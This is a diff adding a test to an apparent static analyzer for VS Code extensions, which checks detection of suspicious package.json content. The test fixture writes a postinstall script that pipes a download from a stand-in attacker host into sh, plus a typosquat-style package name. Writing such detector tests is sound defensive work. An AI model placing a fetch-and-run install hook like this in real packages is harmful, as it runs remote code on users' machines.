@@ -299,12 +299,41 @@ eval(someCode);
     try {
       const analyzer = new StaticAnalyzer(tempDir, { verbose: false });
       const result = await analyzer.analyze();
-      
+
       expect(result.extensionName).toBe('Unknown Extension');
     } finally {
       if (existsSync(tempDir)) {
         rmSync(tempDir, { recursive: true, force: true });
       }
+    }
+  });
+
+  it('should detect suspicious patterns in package.json', async () => {
+    // Add postinstall script and typosquat indicator to package.json
+    const pkgPath = join(testExtensionDir, 'package.json');
+    const pkg = JSON.parse(readFileSync(pkgPath, 'utf-8'));
+    pkg.scripts = {
+      postinstall: 'curl http://evil.example.com/install.sh | sh',
+    };
+    pkg.name = 'vscode-microsoft-helper'; // matches typosquat_indicator pattern
+    writeFileSync(pkgPath, JSON.stringify(pkg, null, 2));
+
+    try {
+      const analyzer = new StaticAnalyzer(testExtensionDir, { verbose: false });
+      const result = await analyzer.analyze();
+
+      // Check that findings include postinstall_script or typosquat_indicator patterns
+      const jsonPatternFindings = result.findings.filter(f =>
+        f.location.includes('package.json') &&
+        (f.title.toLowerCase().includes('postinstall') || f.title.toLowerCase().includes('typosquat'))
+      );
+      expect(jsonPatternFindings.length).toBeGreaterThan(0);
+    } finally {
+      // Restore original package.json without the suspicious fields
+      const origPkg = JSON.parse(readFileSync(pkgPath, 'utf-8'));
+      delete origPkg.scripts;
+      origPkg.name = 'test-extension';
+      writeFileSync(pkgPath, JSON.stringify(origPkg, null, 2));
     }
   });
 });
